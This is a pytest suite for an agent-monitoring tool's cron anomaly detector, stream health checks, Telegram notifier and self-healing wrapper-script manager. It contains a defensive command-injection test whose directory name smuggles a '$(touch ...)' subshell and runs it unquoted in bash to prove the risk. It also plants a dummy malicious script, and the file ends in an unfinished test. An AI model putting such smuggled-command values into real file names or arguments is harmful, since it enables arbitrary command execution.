"""
Test Suite for Hermes Agent 24/7 Hourly Digest Monitor, Cronjob Clog & Anomaly Detector,
Entropy Stream Degradation Scanner, Composite Health Calculator, and Self-Healing Engine.
"""

import errno
try:
    import fcntl
except ImportError:
    fcntl = None
import hashlib
import html
import itertools
import json
import os
import re
import secrets
import shlex
import sqlite3
import statistics
import subprocess
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import List
from unittest.mock import MagicMock, patch

import pytest

from tools.hourly_digest_monitor import (
    CompositeHealthCalculator,
    CronAnomalyDetector,
    EntropyDegradationDetector,
    HermesTelegramNotifier,
    SelfHealingManager,
    run_full_scan,
)


# ==============================================================================
# Fixtures
# ==============================================================================
@pytest.fixture
def temp_dir(tmp_path):
    return tmp_path


@pytest.fixture
def mock_executions_db(tmp_path):
    db_file = tmp_path / "executions.db"
    conn = sqlite3.connect(str(db_file))
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE executions (
            id TEXT PRIMARY KEY,
            job_id TEXT NOT NULL,
            source TEXT NOT NULL,
            process_id TEXT NOT NULL,
            pid INTEGER NOT NULL,
            process_started_at INTEGER,
            status TEXT NOT NULL,
            claimed_at TEXT NOT NULL,
            started_at TEXT,
            finished_at TEXT,
            error TEXT,
            cost REAL,
            tokens INTEGER
        )
        """
    )
    # Job 1: 3 consecutive failures (CLOGGED)
    for i in range(3):
        c.execute(
            """
            INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
            VALUES (?, 'job_clogged_1', 'builtin', 'proc_1', 100, 'failed', ?, 'RuntimeError: Execution failed')
            """,
            (f"e_clogged_{i}", f"2026-10-12T10:{i:02d}:00Z"),
        )

    # Job 2: 2 failures then 1 completed (NOT clogged)
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_ok_old1', 'job_recovered', 'builtin', 'proc_1', 100, 'failed', '2026-10-12T08:00:00Z', 'err')
        """
    )
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_ok_old2', 'job_recovered', 'builtin', 'proc_1', 100, 'failed', '2026-10-12T08:30:00Z', 'err')
        """
    )
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_ok_latest', 'job_recovered', 'builtin', 'proc_1', 100, 'completed', '2026-10-12T09:00:00Z', NULL)
        """
    )

    # Job 3: 1 single failure (NOT clogged)
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_single_fail', 'job_single', 'builtin', 'proc_1', 100, 'failed', '2026-10-12T10:00:00Z', 'single err')
        """
    )

    conn.commit()
    conn.close()
    return db_file


@pytest.fixture
def mock_jobs_json(tmp_path):
    jobs_file = tmp_path / "jobs.json"
    now_utc = datetime.now(timezone.utc)
    overdue_time = (now_utc - timedelta(seconds=1200)).isoformat()
    future_time = (now_utc + timedelta(seconds=3600)).isoformat()

    data = {
        "updated_at": now_utc.isoformat(),
        "jobs": [
            {
                "id": "job_clogged_1",
                "name": "clogged-service",
                "enabled": True,
                "model": None,
                "provider": None,
                "model_snapshot": "cx/gpt-5.6-luna",
                "provider_snapshot": "custom",
                "drift_alerted": True,
                "next_run_at": future_time,
                "last_error": "RuntimeError: [drift_skip:silent] Skipped to prevent unintended spend",
            },
            {
                "id": "job_overdue_1",
                "name": "overdue-crawler",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "model_snapshot": "codex",
                "provider_snapshot": "custom",
                "drift_alerted": False,
                "next_run_at": overdue_time,
                "last_error": None,
            },
            {
                "id": "job_auth_fail",
                "name": "gmail-sync",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "drift_alerted": False,
                "next_run_at": future_time,
                "last_error": "Token refresh failed: ('invalid_grant: Bad Request', {'error': 'invalid_grant'})",
            },
            {
                "id": "job_rate_limited",
                "name": "c3ai-mirror",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "drift_alerted": False,
                "next_run_at": future_time,
                "last_error": "HTTP 503: [codex] [429]: The usage limit has been reached",
            },
            {
                "id": "job_healthy",
                "name": "healthy-heartbeat",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "model_snapshot": "codex",
                "provider_snapshot": "custom",
                "drift_alerted": False,
                "next_run_at": future_time,
                "last_error": None,
            },
        ],
    }
    with open(jobs_file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    return jobs_file


@pytest.fixture
def mock_ticker_heartbeat(tmp_path):
    hb_file = tmp_path / "ticker_heartbeat"
    now_ts = time.time() - 30.0  # 30s ago -> fresh
    hb_file.write_text(str(now_ts), encoding="utf-8")
    return hb_file


# ==============================================================================
# 1. Tests: CronAnomalyDetector
# ==============================================================================
def test_cron_anomaly_detector_clogged_jobs(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    clogged = detector.check_clogged_jobs(min_failures=3)
    assert len(clogged) == 1
    assert clogged[0]["job_id"] == "job_clogged_1"
    assert clogged[0]["job_name"] == "clogged-service"
    assert clogged[0]["consecutive_failures"] == 3


def test_cron_anomaly_detector_drift_skipped_jobs(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    drifted = detector.check_drift_skipped_jobs()
    assert len(drifted) == 1
    assert drifted[0]["job_id"] == "job_clogged_1"
    assert drifted[0]["drift_alerted"] is True
    assert "[drift_skip" in drifted[0]["last_error"]


def test_cron_anomaly_detector_overdue_jobs(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
        grace_period_seconds=300,
    )
    now_utc = datetime.now(timezone.utc)
    overdue = detector.check_overdue_jobs(now_utc=now_utc)
    assert len(overdue) == 1
    assert overdue[0]["job_id"] == "job_overdue_1"
    assert overdue[0]["overdue_seconds"] > 300


def test_cron_anomaly_detector_auth_and_rate_limited(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    auth_failed = detector.check_auth_failed_jobs()
    assert len(auth_failed) == 1
    assert auth_failed[0]["job_id"] == "job_auth_fail"

    rate_limited = detector.check_rate_limited_jobs()
    assert len(rate_limited) == 1
    assert rate_limited[0]["job_id"] == "job_rate_limited"


def test_cron_anomaly_detector_ticker_fresh_and_stale(tmp_path, mock_executions_db, mock_jobs_json):
    # Test fresh ticker
    hb_fresh = tmp_path / "ticker_fresh"
    now_utc = datetime.now(timezone.utc)
    hb_fresh.write_text(str(now_utc.timestamp() - 40.0), encoding="utf-8")

    det_fresh = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=hb_fresh,
    )
    res_fresh = det_fresh.check_ticker_stale(max_age_seconds=120.0, now_utc=now_utc)
    assert res_fresh["exists"] is True
    assert res_fresh["is_stale"] is False
    assert res_fresh["age_seconds"] < 120.0

    # Test stale ticker (>120s)
    hb_stale = tmp_path / "ticker_stale"
    hb_stale.write_text(str(now_utc.timestamp() - 250.0), encoding="utf-8")
    det_stale = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=hb_stale,
    )
    res_stale = det_stale.check_ticker_stale(max_age_seconds=120.0, now_utc=now_utc)
    assert res_stale["is_stale"] is True
    assert res_stale["age_seconds"] >= 250.0


def test_cron_health_score(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    findings = detector.scan()
    # Has clogged, drift, overdue, auth, and rate-limited
    score = findings["cron_health_score"]
    assert 0 <= score < 60


# ==============================================================================
# 2. Tests: EntropyDegradationDetector (All 5 Streams)
# ==============================================================================
def test_entropy_stream_1_stock_news(tmp_path):
    db_file = tmp_path / "stock_news.sqlite"
    conn = sqlite3.connect(str(db_file))
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE raw_articles (
            url_hash TEXT PRIMARY KEY,
            symbol TEXT,
            published_at TEXT,
            crawled_at TEXT
        )
        """
    )
    c.execute("CREATE TABLE corporate_events (event_id TEXT PRIMARY KEY)")

    now_utc = datetime.now(timezone.utc)

    # 1. Fresh state: crawled 1 hour ago
    c.execute(
        "INSERT INTO raw_articles VALUES ('h1', 'FPT', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=1)).isoformat(),),
    )
    c.execute(
        "INSERT INTO raw_articles VALUES ('h2', 'HPG', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=0.5)).isoformat(),),
    )
    conn.commit()

    detector = EntropyDegradationDetector(stock_db_path=db_file)
    res = detector.check_stream_1_stock_news(now_utc=now_utc)
    assert res["status"] == "HEALTHY"
    assert res["score"] == 100
    assert res["unique_symbols"] == 2
    assert res["articles_24h"] == 2

    # 2. Degraded state: crawled 4 hours ago
    c.execute("DELETE FROM raw_articles")
    c.execute(
        "INSERT INTO raw_articles VALUES ('h3', 'CII', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=4)).isoformat(),),
    )
    conn.commit()
    res_deg = detector.check_stream_1_stock_news(now_utc=now_utc)
    assert res_deg["status"] == "DEGRADED"
    assert res_deg["score"] == 50

    # 3. Critical state: crawled 8 hours ago
    c.execute("DELETE FROM raw_articles")
    c.execute(
        "INSERT INTO raw_articles VALUES ('h4', 'CII', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=8)).isoformat(),),
    )
    conn.commit()
    res_crit = detector.check_stream_1_stock_news(now_utc=now_utc)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0

    conn.close()


def test_entropy_stream_2_legal_docs(tmp_path):
    legal_dir = tmp_path / "legal_docs"
    legal_dir.mkdir()
    history_db = legal_dir / "history.sqlite"
    conn = sqlite3.connect(str(history_db))
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE legal_documents (
            doc_id TEXT PRIMARY KEY,
            so_hieu TEXT,
            crawled_at TEXT
        )
        """
    )
    now_utc = datetime.now(timezone.utc)

    # 1. Fresh state: crawled 10 hours ago
    c.execute(
        "INSERT INTO legal_documents VALUES ('d1', '123/ND-CP', ?)",
        ((now_utc - timedelta(hours=10)).isoformat(),),
    )
    conn.commit()

    detector = EntropyDegradationDetector(legal_dir_path=legal_dir)
    res_fresh = detector.check_stream_2_legal_docs(now_utc=now_utc)
    assert res_fresh["status"] == "HEALTHY"
    assert res_fresh["score"] == 100
    assert res_fresh["total_documents"] == 1

    # 2. Degraded state: crawled 40 hours ago
    c.execute("DELETE FROM legal_documents")
    c.execute(
        "INSERT INTO legal_documents VALUES ('d2', '456/ND-CP', ?)",
        ((now_utc - timedelta(hours=40)).isoformat(),),
    )
    conn.commit()
    res_deg = detector.check_stream_2_legal_docs(now_utc=now_utc)
    assert res_deg["status"] == "DEGRADED"
    assert res_deg["score"] == 50

    # 3. Critical state: crawled 90 hours ago
    c.execute("DELETE FROM legal_documents")
    c.execute(
        "INSERT INTO legal_documents VALUES ('d3', '789/ND-CP', ?)",
        ((now_utc - timedelta(hours=90)).isoformat(),),
    )
    conn.commit()
    res_crit = detector.check_stream_2_legal_docs(now_utc=now_utc)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0

    conn.close()


def test_entropy_stream_3_media_production(tmp_path):
    media_file = tmp_path / "daily_media.json"
    now = datetime(2026, 10, 12, 14, 0, 0)  # hour 14

    # 1. Fresh state: hour 14, completed 14 videos
    data_fresh = {
        "date": "2026-10-12",
        "target_videos": 24,
        "target_photos": 24,
        "completed_videos": 14,
        "completed_photos": 14,
    }
    media_file.write_text(json.dumps(data_fresh), encoding="utf-8")
    detector = EntropyDegradationDetector(media_json_path=media_file)
    res_fresh = detector.check_stream_3_media_production(now=now)
    assert res_fresh["status"] == "HEALTHY"
    assert res_fresh["score"] == 100
    assert res_fresh["current_hour_lag"] == 0

    # 2. Degraded state: completed 11 videos (lag 3)
    data_deg = {
        "date": "2026-10-12",
        "target_videos": 24,
        "target_photos": 24,
        "completed_videos": 11,
        "completed_photos": 11,
    }
    media_file.write_text(json.dumps(data_deg), encoding="utf-8")
    res_deg = detector.check_stream_3_media_production(now=now)
    assert res_deg["status"] == "DEGRADED"
    assert res_deg["score"] == 50
    assert res_deg["current_hour_lag"] == 3

    # 3. Critical state: 0 completed videos
    data_crit = {
        "date": "2026-10-12",
        "target_videos": 24,
        "target_photos": 24,
        "completed_videos": 0,
        "completed_photos": 0,
    }
    media_file.write_text(json.dumps(data_crit), encoding="utf-8")
    res_crit = detector.check_stream_3_media_production(now=now)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0


def test_entropy_stream_4_median_sync(tmp_path):
    log_file = tmp_path / "median_hourly_sync.log"
    now_utc = datetime.now(timezone.utc)

    # 1. Healthy state
    log_file.write_text(
        "Checks:                58 / 58, 100%, Listed 116\n"
        "✅ [MedianSync] ✅ Hourly Sync Cycle Complete.\n"
        "✅ [Hermes Cron] Hourly Sync completed successfully.\n",
        encoding="utf-8",
    )
    detector = EntropyDegradationDetector(median_log_path=log_file)
    res_fresh = detector.check_stream_4_median_sync(now_utc=now_utc)
    assert res_fresh["status"] == "HEALTHY"
    assert res_fresh["score"] == 100
    assert res_fresh["checks_count"] == 58
    assert res_fresh["exit_code"] == 0

    # 2. Critical state: exit code failure
    log_file.write_text(
        "❌ [Hermes Cron] Hourly Sync failed with exit code 2.\n",
        encoding="utf-8",
    )
    res_crit = detector.check_stream_4_median_sync(now_utc=now_utc)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0
    assert res_crit["exit_code"] == 2


def test_entropy_stream_5_fleet_mesh(tmp_path):
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
    )

    # Healthy state mock
    summary_resp = json.dumps({"online_nodes": 19, "total_nodes": 21}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 99.0, "sla_passed": True}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        else:
            mock_obj.read.return_value = council_resp
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh()
        assert res["status"] == "HEALTHY"
        assert res["score"] == 99
        assert res["active_nodes"] == 19
        assert res["sla_passed"] is True

    # Critical fallback when offline
    with patch("urllib.request.urlopen", side_effect=Exception("Connection refused")):
        res_down = detector.check_stream_5_fleet_mesh()
        assert res_down["status"] == "CRITICAL"
        assert res_down["score"] == 0


# ==============================================================================
# 3. Tests: CompositeHealthCalculator
# ==============================================================================
def test_composite_health_calculator():
    # 1. Nominal / Healthy state
    score_healthy, sev_healthy = CompositeHealthCalculator.calculate(
        cron_score=95, entropy_score=90, mesh_score=100, ticker_score=100
    )
    # 0.35*95 + 0.35*90 + 0.15*100 + 0.15*100 = 33.25 + 31.5 + 15 + 15 = 94.75 -> 95
    assert score_healthy >= 85
    assert sev_healthy == "HEALTHY"

    # 2. Warning state
    score_warn, sev_warn = CompositeHealthCalculator.calculate(
        cron_score=60, entropy_score=70, mesh_score=80, ticker_score=100
    )
    # 0.35*60 + 0.35*70 + 0.15*80 + 0.15*100 = 21 + 24.5 + 12 + 15 = 72.5 -> 72
    assert 60 <= score_warn < 85
    assert sev_warn == "WARNING"

    # 3. Critical state
    score_crit, sev_crit = CompositeHealthCalculator.calculate(
        cron_score=20, entropy_score=30, mesh_score=50, ticker_score=0
    )
    # 0.35*20 + 0.35*30 + 0.15*50 + 0 = 7 + 10.5 + 7.5 = 25
    assert score_crit < 60
    assert sev_crit == "CRITICAL"


# ==============================================================================
# 4. Tests: HermesTelegramNotifier
# ==============================================================================
def test_hermes_telegram_notifier(tmp_path):
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\nTELEGRAM_ALLOWED_USERS=1431349185\n")

    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id="1431349185")
    assert notifier.bot_token == "test-token-123"
    assert notifier.target_chat_id == "1431349185"

    scan_sample = {
        "overall_health_score": 45,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 20,
            "clogged_jobs": [{"job_name": "media-producer", "consecutive_failures": 97, "last_error": "Drift skip"}],
            "drift_skipped_jobs": [{"job_name": "media-producer", "model_snapshot": "cx/gpt-5.6-luna"}],
            "auth_failed_jobs": [{"job_name": "gmail-sync", "last_error": "invalid_grant"}],
            "rate_limited_jobs": [],
            "overdue_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 15.0},
        },
        "entropy": {
            "entropy_health_score": 40,
            "streams": [
                {"name": "Stock News Feed", "status": "CRITICAL", "hours_since_crawl": 120.0, "articles_24h": 0, "unique_symbols": 0},
                {"name": "Media Asset Bank 24/7", "status": "CRITICAL", "completed_videos": 0, "current_hour_lag": 15},
            ],
        },
    }

    # Format alerts
    alert_html = notifier.format_urgent_alert(scan_sample)
    assert "HERMES CRITICAL ALERT" in alert_html
    assert "media-producer" in alert_html
    assert "gmail-sync" in alert_html

    digest_html = notifier.format_hourly_digest(scan_sample)
    assert "HERMES AGENT" in digest_html
    assert "Composite Health" in digest_html

    # Test delivery mock
    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    with patch("urllib.request.urlopen", return_value=mock_resp):
        assert notifier.send_alert(alert_html) is True
        assert notifier.send_digest(digest_html) is True


# ==============================================================================
# 5. Tests: SelfHealingManager
# ==============================================================================
def test_self_healing_manager_drift_skips(tmp_path):
    jobs_file = tmp_path / "jobs.json"
    initial_data = {
        "updated_at": "2026-10-10T00:00:00Z",
        "jobs": [
            {
                "id": "job_drifted_1",
                "name": "media-footage-producer",
                "model": None,
                "provider": None,
                "model_snapshot": "cx/gpt-5.6-luna",
                "provider_snapshot": "custom",
                "drift_alerted": True,
                "last_error": "RuntimeError: [drift_skip:silent] Skipped to prevent unintended spend",
                "last_status": "error",
            },
            {
                "id": "job_clean_2",
                "name": "healthy-job",
                "model": "codex",
                "provider": "custom",
                "model_snapshot": "codex",
                "provider_snapshot": "custom",
                "drift_alerted": False,
                "last_error": None,
                "last_status": "scheduled",
            },
        ],
    }
    with open(jobs_file, "w", encoding="utf-8") as f:
        json.dump(initial_data, f, indent=2)

    manager = SelfHealingManager(jobs_path=jobs_file)
    healed = manager.self_heal_drift_skips()

    assert len(healed) == 1
    assert healed[0]["id"] == "job_drifted_1"
    assert healed[0]["model"] == "codex"
    assert healed[0]["provider"] == "custom"

    # Verify updated content on disk
    with open(jobs_file, "r", encoding="utf-8") as f:
        saved = json.load(f)

    job1 = saved["jobs"][0]
    assert job1["model"] == "codex"
    assert job1["provider"] == "custom"
    assert job1["model_snapshot"] == "codex"
    assert job1["provider_snapshot"] == "custom"
    assert job1["drift_alerted"] is False
    assert job1["last_error"] is None
    assert job1["last_status"] == "scheduled"


def test_self_healing_manager_install_uninstall_cron(tmp_path):
    """Verify install_hourly_cron and uninstall_hourly_cron modify jobs.json properly."""
    jobs_file = tmp_path / "jobs.json"
    with open(jobs_file, "w", encoding="utf-8") as f:
        json.dump({"jobs": []}, f, indent=2)

    manager = SelfHealingManager(jobs_path=jobs_file, repo_dir=tmp_path)
    res_inst = manager.install_hourly_cron()
    assert res_inst["status"] == "installed"
    assert res_inst["job_id"] == "job_hermes_hourly_digest"

    with open(jobs_file, "r", encoding="utf-8") as f:
        data = json.load(f)
    assert len(data["jobs"]) == 1
    assert data["jobs"][0]["id"] == "job_hermes_hourly_digest"
    assert data["jobs"][0]["no_agent"] is True
    assert data["jobs"][0]["schedule"]["expr"] == "0 * * * *"

    # Now uninstall
    res_uninst = manager.uninstall_hourly_cron()
    assert res_uninst["status"] == "uninstalled"

    with open(jobs_file, "r", encoding="utf-8") as f:
        data2 = json.load(f)
    assert len(data2["jobs"]) == 0


def test_wrapper_shlex_quoting_prevents_command_injection(tmp_path):
    """Adversarial boundary test: verify path with command injection vector is safely quoted (CWE-78)."""
    pwned_marker = tmp_path / "pwned_audit_test"
    if pwned_marker.exists():
        pwned_marker.unlink()

    malicious_repo = tmp_path / f"repo$(touch {pwned_marker})"
    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=malicious_repo,
        scripts_dir=tmp_path / "scripts",
    )

    content, digest = manager.render_wrapper_content()

    # The marker file MUST NOT have been created
    assert not pwned_marker.exists(), "Command injection vulnerability: payload executed during rendering!"

    expected = shlex.quote(str(malicious_repo))
    # Strict positive oracle: the exact shlex-quoted form must be present
    assert expected in content, f"repo_dir was not shlex-quoted; expected {expected!r} in content"
    # Negative oracle: the raw $(...) sequence must not survive unquoted outside the literal
    assert "$(touch" not in content.replace(expected, ""), "injection sequence present outside quoted literal"
    assert f'"{malicious_repo}"' not in content
    assert f'={malicious_repo}' not in content
    assert len(digest) == 64

    # Behavioral execution oracle: execute bash variable assignment in real shell
    # If expected was unquoted, bash would expand $(touch ...) and create pwned_marker.
    import subprocess
    subprocess.run(["bash", "-c", f"REPO_DIR={expected}\n:"], check=True)
    assert not pwned_marker.exists(), "Command injection payload executed during bash variable assignment!"

    # Mutation test: prove that without shlex.quote, bash DOES execute the subshell payload
    unquoted_payload = str(malicious_repo)
    subprocess.run(["bash", "-c", f"REPO_DIR={unquoted_payload}\n:"], check=True)
    assert pwned_marker.exists(), "Mutation check failed: unquoted payload did not trigger injection!"
    pwned_marker.unlink()


def test_wrapper_symlinked_scripts_dir_refused(tmp_path):
    """Verify ensure_wrapper_script refuses to write to a symlinked scripts_dir (CWE-427)."""
    real_target = tmp_path / "real_scripts_target"
    real_target.mkdir(parents=True, exist_ok=True)
    symlink_dir = tmp_path / "symlinked_scripts"
    symlink_dir.symlink_to(real_target, target_is_directory=True)

    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=symlink_dir,
    )

    with pytest.raises(RuntimeError, match="scripts_dir open refused"):
        manager.ensure_wrapper_script()


def test_scripts_dir_parent_symlink_refused(tmp_path):
    """Verify ensure_wrapper_script refuses to write if an ancestor directory is a symlink (CWE-427)."""
    decoy_parent = tmp_path / "decoy_parent"
    decoy_parent.mkdir(parents=True, exist_ok=True)
    symlink_parent = tmp_path / "symlink_parent"
    symlink_parent.symlink_to(decoy_parent, target_is_directory=True)
    nested_scripts_dir = symlink_parent / "nested_scripts"

    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested_scripts_dir,
    )

    with pytest.raises(RuntimeError, match="scripts_dir ancestor is a symlink, refusing"):
        manager.ensure_wrapper_script()


def test_wrapper_write_anchored_to_validated_dir(tmp_path):
    """Verify ensure_wrapper_script writes relative to dir_fd using openat/renameat semantics."""
    scripts_dir = tmp_path / "scripts"
    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )
    wrapper_path, digest = manager.ensure_wrapper_script()
    assert wrapper_path.exists()
    assert wrapper_path.name == "hermes_hourly_digest.sh"
    content = wrapper_path.read_text(encoding="utf-8")
    assert "set -euo pipefail" in content
    import hashlib
    assert hashlib.sha256(content.encode("utf-8")).hexdigest() == digest


def test_wrapper_reconciliation_overwrites_tampered_script(tmp_path):
    """Verify pre-planted or tampered wrapper script is overwritten with canonical content (CWE-427 / CWE-367)."""
    scripts_dir = tmp_path / "scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    tampered_file = scripts_dir / "hermes_hourly_digest.sh"
    tampered_file.write_text("#!/bin/bash\necho 'MALICIOUS_PRE_PLANTED_PAYLOAD'\n", encoding="utf-8")

    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "hermes_repo",
        scripts_dir=scripts_dir,
    )

    # Calling ensure_wrapper_script must detect content mismatch and overwrite atomically
    script_path, digest = manager.ensure_wrapper_script()

    assert script_path == tampered_file
    new_content = tampered_file.read_text(encoding="utf-8")
    assert "MALICIOUS_PRE_PLANTED_PAYLOAD" not in new_content
    assert "hourly_digest_monitor.py" in new_content
    # Verify file permissions are 0o700 (owner executable only)
    st = tampered_file.stat()
    assert (st.st_mode & 0o777) == 0o700


def test_wrapper_reconciliation_in_self_heal_drift_skips(tmp_path):
    """Verify self_heal_drift_skips automatically reconciles the wrapper script."""
    jobs_file = tmp_path / "jobs.json"
    jobs_file.write_text(json.dumps({"jobs": []}), encoding="utf-8")
    scripts_dir = tmp_path / "scripts"

    manager = SelfHealingManager(
        jobs_path=jobs_file,
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Wrapper does not exist initially
    wrapper = scripts_dir / "hermes_hourly_digest.sh"
    assert not wrapper.exists()

    manager.self_heal_drift_skips()

    # Wrapper must be created by self-heal
    assert wrapper.exists()
    assert (wrapper.stat().st_mode & 0o777) == 0o700


def test_scripts_dir_dangling_symlink_ancestor_refused(tmp_path):
    """CWE-427 / A1: a DANGLING symlink ancestor must be refused (prevents fail-open bypass)."""
    link = tmp_path / "dangling"
    link.symlink_to(tmp_path / "does_not_exist", target_is_directory=True)
    nested = link / "nested_scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested,
    )
    with pytest.raises(RuntimeError, match="symlink, refusing"):
        mgr.ensure_wrapper_script()


def test_scripts_dir_home_unset_does_not_crash(tmp_path, monkeypatch):
    """A3: HOME unset and Path.home() raising (cron/systemd) must not crash wrapper generation."""
    monkeypatch.delenv("HOME", raising=False)
    monkeypatch.delenv("USERPROFILE", raising=False)

    def mock_home():
        raise RuntimeError("No home directory entry found in environment or passwd")

    monkeypatch.setattr(Path, "home", staticmethod(mock_home))

    scripts_dir = tmp_path / "scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )
    # Must complete the real write path, not raise RuntimeError from home resolution.
    wrapper_path, sha = mgr.ensure_wrapper_script()
    assert wrapper_path.exists()
    assert len(sha) == 64


def test_scripts_dir_mid_path_symlink_refused(tmp_path):
    """Deep ancestor (not immediate parent) symlink must be refused."""
    real = tmp_path / "real"
    real.mkdir()
    link = tmp_path / "mid"
    link.symlink_to(real, target_is_directory=True)
    nested = link / "a" / "b" / "scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested,
    )
    with pytest.raises(RuntimeError, match="symlink, refusing"):
        mgr.ensure_wrapper_script()


def test_scripts_dir_symlink_refusal_emits_structured_audit_event(tmp_path, caplog):
    """Verify symlink refusal emits structured JSON audit event for SIEM/observability."""
    import logging
    decoy_parent = tmp_path / "decoy_parent"
    decoy_parent.mkdir(parents=True, exist_ok=True)
    symlink_parent = tmp_path / "symlink_parent"
    symlink_parent.symlink_to(decoy_parent, target_is_directory=True)
    nested_scripts_dir = symlink_parent / "nested_scripts"

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested_scripts_dir,
    )

    with caplog.at_level(logging.ERROR):
        with pytest.raises(RuntimeError, match="scripts_dir ancestor is a symlink, refusing"):
            mgr.ensure_wrapper_script()

    # Verify structured audit event exists in log records
    found_event = False
    for record in caplog.records:
        try:
            data = json.loads(record.message)
            if data.get("event") == "scripts_dir_symlink_refused":
                assert data.get("component") in (str(symlink_parent), symlink_parent.name)
                assert data.get("scripts_dir") == str(nested_scripts_dir)
                assert "euid" in data
                assert "ts" in data
                found_event = True
                break
        except (json.JSONDecodeError, TypeError):
            continue
    assert found_event, "Structured audit log event 'scripts_dir_symlink_refused' was not emitted!"


def test_home_fallback_target_is_safe(tmp_path, monkeypatch):
    """B2 / A2: Fallback when Path.home() raises must land cleanly in scripts_dir without putting /tmp on PATH."""
    monkeypatch.delenv("HOME", raising=False)
    monkeypatch.delenv("USERPROFILE", raising=False)
    monkeypatch.setattr(Path, "home", staticmethod(lambda: (_ for _ in ()).throw(RuntimeError("Unset home"))))

    target_scripts = tmp_path / "custom_scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=target_scripts,
    )
    wp, digest = mgr.ensure_wrapper_script()
    assert wp.exists()
    assert wp.parent == target_scripts
    content = wp.read_text(encoding="utf-8")
    # Must NOT put world-writable /tmp on PATH
    assert "/tmp/.local/bin" not in content
    assert "/usr/local/bin" in content


def test_wrapper_temp_is_exclusive_and_nofollow(tmp_path):
    """B3 / A3: Temp creation must use O_CREAT | O_EXCL | O_NOFOLLOW in the real implementation."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

